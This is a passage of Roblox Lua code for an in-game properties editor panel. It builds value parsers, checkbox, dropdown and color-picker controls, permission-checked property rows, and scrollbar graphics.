		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		if tonumber(value) ~= nil then
			value = ContentUrl .. value
		end
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	else
		return nil
	end
end


-- Tables

local function CopyTable(T)
  local t2 = {}
  for k,v in pairs(T) do
    t2[k] = v
  end
  return t2
end

local function SortTable(T)
	table.sort(T, 
		function(x,y) return x.Name < y.Name
	end)
end

-- Spritesheet
local Sprite = {
	Width = 13;
	Height = 13;
}

local Spritesheet = {
	Image = "http://www.roblox.com/asset/?id=128896947";
	Height = 256;
	Width = 256;
}

local Images = {
	"unchecked",
	"checked",
	"unchecked_over",
	"checked_over",
	"unchecked_disabled",
	"checked_disabled"
}

local function SpritePosition(spriteName)
	local x = 0
	local y = 0
	for i,v in pairs(Images) do
		if (v == spriteName) then
			return {x, y}
		end
		x = x + Sprite.Height
		if (x + Sprite.Width) > Spritesheet.Width then
			x = 0
			y = y + Sprite.Height
		end
	end
end

local function GetCheckboxImageName(checked, readOnly, mouseover)
	if checked then
		if readOnly then
			return "checked_disabled"
		elseif mouseover then
			return "checked_over"
		else
			return "checked"
		end
	else
		if readOnly then
			return "unchecked_disabled"
		elseif mouseover then
			return "unchecked_over"
		else
			return "unchecked"
		end
	end
end

local MAP_ID = 418720155

-- Gui Controls --

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

local function CreateCell()
	local tableCell = Instance.new("Frame")
	tableCell.Size = UDim2.new(0.5, -1, 1, 0)
	tableCell.BackgroundColor3 = Row.BackgroundColor
	tableCell.BorderColor3 = Row.BorderColor
	return tableCell
end
	
local function CreateLabel(readOnly)
	local label = Instance.new("TextLabel")
	label.Font = Row.Font
	label.FontSize = Row.FontSize
	label.TextXAlignment = Row.TextXAlignment
	label.BackgroundTransparency = 1
	
	if readOnly then
		label.TextColor3 = Row.TextLockedColor
	else
		label.TextColor3 = Row.TextColor
	end
	return label
end

local function CreateTextButton(readOnly, onClick)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
		button.MouseButton1Click:connect(function()
			onClick()
		end)
	end
	return button
end

local function CreateObject(readOnly)
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	else
		button.TextColor3 = Row.TextColor
	end
	local cancel = Create(Icon('ImageButton',177),{
		Name = "Cancel";
		Visible = false;
		Position = UDim2.new(1,-20,0,0);
		Size = UDim2.new(0,20,0,20);
		Parent = button;
	})
	return button
end

local function CreateTextBox(readOnly)
	if readOnly then
		local box = CreateLabel(readOnly)
		return box
	else
		local box = Instance.new("TextBox")
		if not SettingsRemote:Invoke("ClearProps") then
			box.ClearTextOnFocus = false
		end
		box.Font = Row.Font
		box.FontSize = Row.FontSize
		box.TextXAlignment = Row.TextXAlignment
		box.BackgroundTransparency = 1
		box.TextColor3 = Row.TextColor
		return box
	end
end

local function CreateDropDownItem(text, onClick)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		onClick(text)
	end)	
	return button
end

local function CreateDropDown(choices, currentChoice, readOnly, onClick)
	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	
	local function showArrow(color)
		if arrow then arrow:Destroy() end
		
		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = color;
		})
		local graphicSize = 16/2
		
		arrow = ArrowGraphic(graphicSize,'Down',true,graphicTemplate)
		arrow.Position = UDim2.new(1,-graphicSize * 2,0.5,-graphicSize/2)
		arrow.Parent = frame
	end
	
	local function hideMenu()
		expanded = false
		showArrow(DropDown.ArrowColor)
		if menu then menu:Destroy() end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(1, -2 * margin, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, Row.Height + margin)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		local parentFrameHeight = menu.Parent.Parent.Parent.Parent.Size.Y.Offset
		local rowHeight = menu.Parent.Parent.Parent.Position.Y.Offset
		if (rowHeight + menu.Size.Y.Offset) > math.max(parentFrameHeight,PropertiesFrame.AbsoluteSize.y) then
			menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateDropDownItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 16)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end
	
	showArrow(DropDown.ArrowColor)
	
	if not readOnly then
		
		button.MouseEnter:connect(function()
			button.TextColor3 = Row.TextColor
			showArrow(DropDown.ArrowColorOver)
		end)
		button.MouseLeave:connect(function()
			button.TextColor3 = Row.TextColor
			if not expanded then
				showArrow(DropDown.ArrowColor)
			end
		end)
		button.MouseButton1Click:connect(function()
			if expanded then
				hideMenu()
			else
				showMenu()
			end
		end)
	end
	
	return frame,button
end

local function CreateBrickColor(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorPalette = Instance.new("Frame")
	colorPalette.BackgroundTransparency = 0
	colorPalette.SizeConstraint = Enum.SizeConstraint.RelativeXX
	colorPalette.Size = UDim2.new(1, -2 * BrickColors.OuterBorder, 1, -2 * BrickColors.OuterBorder)
	colorPalette.BorderSizePixel = BrickColors.BorderSizePixel
	colorPalette.BorderColor3 = BrickColors.BorderColor
	colorPalette.Position = UDim2.new(0, BrickColors.OuterBorder, 0, BrickColors.OuterBorder + Row.Height)
	colorPalette.ZIndex = 5
	colorPalette.Visible = false
	colorPalette.BorderSizePixel = BrickColors.OuterBorder
	colorPalette.BorderColor3 = BrickColors.OuterBorderColor
	colorPalette.Parent = frame
	
	local function show()
		colorPalette.Visible = true
	end
	
	local function hide()
		colorPalette.Visible = false
	end
	
	local function toggle()
		colorPalette.Visible = not colorPalette.Visible
	end
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.MouseButton1Click:connect(function()
		if not readOnly then
			toggle()
		end
	end)
	
	if readOnly then
		colorBox.AutoButtonColor = false
	end
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	
	local propertyLabel = CreateTextButton(readOnly, function()
		if not readOnly then
			toggle()
		end
	end)
	propertyLabel.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	propertyLabel.Position = UDim2.new(0, spacingBefore, 0, 0)
	propertyLabel.Parent = frame
	
	local size = (1 / BrickColors.ColorsPerRow)
	
	for index = 0, 127 do
		local brickColor = BrickColor.palette(index)
		local color3 = brickColor.Color
		
		local x = size * (index % BrickColors.ColorsPerRow)
		local y = size * math.floor(index / BrickColors.ColorsPerRow)
	
		local brickColorBox = Instance.new("TextButton")
		brickColorBox.Text = ""
		brickColorBox.Size = UDim2.new(size,0,size,0)
		brickColorBox.BackgroundColor3 = color3
		brickColorBox.Position = UDim2.new(x, 0, y, 0)
		brickColorBox.ZIndex = colorPalette.ZIndex
		brickColorBox.Parent = colorPalette
	
		brickColorBox.MouseButton1Click:connect(function()
			hide()
			onClick(brickColor)
		end)
	end
	
	return frame,propertyLabel,colorBox
end

local function CreateColor3Control(readOnly, onClick)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1,0,1,0)
	frame.BackgroundTransparency = 1
	
	local colorBox = Instance.new("TextButton", frame)
	colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
	colorBox.Text = ""
	colorBox.AutoButtonColor = false
	
	local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, spacingBefore, 0, 0)
	box.Parent = frame
	
	return frame,box,colorBox
end

function CreateCheckbox(value, readOnly, onClick)
	local checked = value
	local mouseover = false

	local checkboxFrame = Instance.new("ImageButton")
	checkboxFrame.Size = UDim2.new(0, Sprite.Width, 0, Sprite.Height)
	checkboxFrame.BackgroundTransparency = 1
	checkboxFrame.ClipsDescendants = true
	--checkboxFrame.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

	local spritesheetImage = Instance.new("ImageLabel", checkboxFrame)
	spritesheetImage.Name = "SpritesheetImageLabel"
	spritesheetImage.Size = UDim2.new(0, Spritesheet.Width, 0, Spritesheet.Height)
	spritesheetImage.Image = Spritesheet.Image
	spritesheetImage.BackgroundTransparency = 1
	
	local function updateSprite()
		local spriteName = GetCheckboxImageName(checked, readOnly, mouseover)
		local spritePosition = SpritePosition(spriteName)
		spritesheetImage.Position = UDim2.new(0, -1 * spritePosition[1], 0, -1 * spritePosition[2])
	end
	
	local function setValue(val)
		checked = val
		updateSprite()
	end

	if not readOnly then
		checkboxFrame.MouseEnter:connect(function() mouseover = true updateSprite() end)
		checkboxFrame.MouseLeave:connect(function() mouseover = false updateSprite() end)
		checkboxFrame.MouseButton1Click:connect(function()
			onClick(checked)
		end)
	end
	
	updateSprite()
	
	return checkboxFrame, setValue
end



-- Code for handling controls of various data types --

local Controls = {}

Controls["default"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateTextBox(readOnly)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.FocusLost:connect(function(enterPressed)
			Set(object, propertyData, ToValue(box.Text,propertyType))
			update()
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return box
end

Controls["bool"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local checked = object[propertyName]
	
	local checkbox, setValue = CreateCheckbox(checked, readOnly, function(value)
		Set(object, propertyData, not checked)
	end)
	checkbox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
	
	setValue(checked)
	
	local function update()
		checked = object[propertyName]
		setValue(checked)
	end
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("BoolValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	update()
	
	return checkbox
end

Controls["BrickColor"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,label,brickColorBox = CreateBrickColor(readOnly, function(brickColor)
		Set(object, propertyData, brickColor)
	end)
	
	local function update()
		local value = object[propertyName]
		brickColorBox.BackgroundColor3 = value.Color
		label.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Color3"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]

	local frame,textBox,colorBox = CreateColor3Control(readOnly)
	
	textBox.FocusLost:connect(function(enterPressed)
		Set(object, propertyData, ToValue(textBox.Text,"Color3"))
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end)
			
	local function update()
		local value = object[propertyName]
		colorBox.BackgroundColor3 = value
		textBox.Text = ToString(value, "Color3")
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return frame
end

Controls["Enum"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local enumName = object[propertyName].Name
	
	local enumNames = {}
	for _,enum in pairs(Enum[tostring(propertyType)]:GetEnumItems()) do
		table.insert(enumNames, enum.Name)
	end
	
	local dropdown, propertyLabel = CreateDropDown(enumNames, enumName, readOnly, function(value)
		Set(object, propertyData, value)
	end)
	--dropdown.Parent = frame
	
	local function update()
		local value = object[propertyName].Name
		propertyLabel.Text = tostring(value)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	return dropdown
end

Controls["Object"] = function(object, propertyData, readOnly)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	local box = CreateObject(readOnly,function()end)
	box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	box.Position = UDim2.new(0, Styles.Margin, 0, 0)

	local function update()
		if AwaitingObjectObj == object then
			if AwaitingObjectValue == true then
				box.Text = "Select an Object"
				return
			end
		end
		local value = object[propertyName]
		box.Text = ToString(value, propertyType)
	end
	
	if not readOnly then
		box.MouseButton1Click:connect(function()
			if AwaitingObjectValue then
				AwaitingObjectValue = false
				update()
				return
			end
			AwaitingObjectValue = true
			AwaitingObjectObj = object
			AwaitingObjectProp = propertyData
			box.Text = "Select an Object"
		end)
		
		box.Cancel.Visible = true
		box.Cancel.MouseButton1Click:connect(function()
			object[propertyName] = nil
		end)
	end
	
	update()
	
	object.Changed:connect(function(property)
		if (property == propertyName) then
			update()
		end
	end)
	
	if object:IsA("ObjectValue") then
		object.Changed:connect(function(val)
			update()
		end)
	end
	
	return box
end

function GetControl(object, propertyData, readOnly)
	local propertyType = propertyData["ValueType"]
	local control = nil
	
	if Controls[propertyType] then
		control = Controls[propertyType](object, propertyData, readOnly)
	elseif RbxApi.IsEnum(propertyType) then
		control = Controls["Enum"](object, propertyData, readOnly)
	else
		control = Controls["default"](object, propertyData, readOnly)
	end
	return control
end
-- Permissions

function CanEditObject(object)
	local player = Players.LocalPlayer
	local character = player.Character
	return Permissions.CanEdit
end

function CanEditProperty(object,propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "readonly" then
			return false
		end
	end
	return CanEditObject(object)
end

--RbxApi
local function PropertyIsHidden(propertyData)
	local tags = propertyData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

function Set(object, propertyData, value)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	
	if value == nil then return end
	
	for i,v in pairs(GetSelection()) do
		if CanEditProperty(v,propertyData) then
			pcall(function()
				--print("Setting " .. propertyName .. " to " .. tostring(value))
				v[propertyName] = value
			end)
		end
	end
end

function CreateRow(object, propertyData, isAlternateRow)
	local propertyName = propertyData["Name"]
	local propertyType = propertyData["ValueType"]
	local propertyValue = object[propertyName]
	--rowValue, rowValueType, isAlternate
	local backColor = Row.BackgroundColor;
	if (isAlternateRow) then
		backColor = Row.BackgroundColorAlternate
	end
	
	local readOnly = not CanEditProperty(object, propertyData)
	if propertyType == "Instance" or propertyName == "Parent" then readOnly = true end

	local rowFrame = Instance.new("Frame")
	rowFrame.Size = UDim2.new(1,0,0,Row.Height)
	rowFrame.BackgroundTransparency = 1
	rowFrame.Name = 'Row'

	local propertyLabelFrame = CreateCell()
	propertyLabelFrame.Parent = rowFrame
	propertyLabelFrame.ClipsDescendants = true
	
	local propertyLabel = CreateLabel(readOnly)
	propertyLabel.Text = propertyName
	propertyLabel.Size = UDim2.new(1, -1 * Row.TitleMarginLeft, 1, 0)
	propertyLabel.Position = UDim2.new(0, Row.TitleMarginLeft, 0, 0)
	propertyLabel.Parent = propertyLabelFrame

	local propertyValueFrame = CreateCell()
	propertyValueFrame.Size = UDim2.new(0.5, -1, 1, 0)
	propertyValueFrame.Position = UDim2.new(0.5, 0, 0, 0)
	propertyValueFrame.Parent = rowFrame

	local control = GetControl(object, propertyData, readOnly)
	control.Parent = propertyValueFrame

	rowFrame.MouseEnter:connect(function()
		propertyLabelFrame.BackgroundColor3 = Row.BackgroundColorMouseover
		propertyValueFrame.BackgroundColor3 = Row.BackgroundColorMouseover
	end)
	rowFrame.MouseLeave:connect(function()
		propertyLabelFrame.BackgroundColor3 = backColor
		propertyValueFrame.BackgroundColor3 = backColor
	end)
	
	propertyLabelFrame.BackgroundColor3 = backColor
	propertyValueFrame.BackgroundColor3 = backColor
	
	return rowFrame
end

function ClearPropertiesList()
	for _,instance in pairs(ContentFrame:GetChildren()) do
		instance:Destroy()
	end
end

local selection = Gui:FindFirstChild("Selection", 1)
print(selection)

function displayProperties(props)
	for i,v in pairs(props) do
		pcall(function()
			local a = CreateRow(v.object, v.propertyData, ((numRows % 2) == 0))
			a.Position = UDim2.new(0,0,0,numRows*Row.Height)
			a.Parent = ContentFrame
			numRows = numRows + 1
		end)
	end
end

function checkForDupe(prop,props)
	for i,v in pairs(props) do
		if v.propertyData.Name == prop.Name and v.propertyData.ValueType == prop.ValueType then
			return true
		end
	end
	return false
end

function sortProps(t)
	table.sort(t, 
		function(x,y) return x.propertyData.Name < y.propertyData.Name
	end)
end

function showProperties(obj)
	ClearPropertiesList()
	if obj == nil then return end
	local propHolder = {}
	local foundProps = {}
	numRows = 0
	for _,nextObj in pairs(obj) do
		if not foundProps[nextObj.className] then
			foundProps[nextObj.className] = true
			for i,v in pairs(RbxApi.GetProperties(nextObj.className)) do
				local suc, err = pcall(function()
					if not (PropertyIsHidden(v)) and not checkForDupe(v,propHolder) then
						if string.find(string.lower(v.Name),string.lower(propertiesSearch.Text)) or not searchingProperties() then
							table.insert(propHolder,{propertyData = v, object = nextObj})
						end
					end
				end)
				--[[if not suc then 
					warn("Problem getting the value of property " .. v.Name .. " | " .. err)
				end	--]]
			end
		end
	end
	sortProps(propHolder)
	displayProperties(propHolder)
	ContentFrame.Size = UDim2.new(1, 0, 0, numRows * Row.Height)
	scrollBar.ScrollIndex = 0
	scrollBar.TotalSpace = numRows * Row.Height
	scrollBar.Update()
end

----------------------------------------------------------------
-----------------------SCROLLBAR STUFF--------------------------
----------------------------------------------------------------
----------------------------------------------------------------
local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
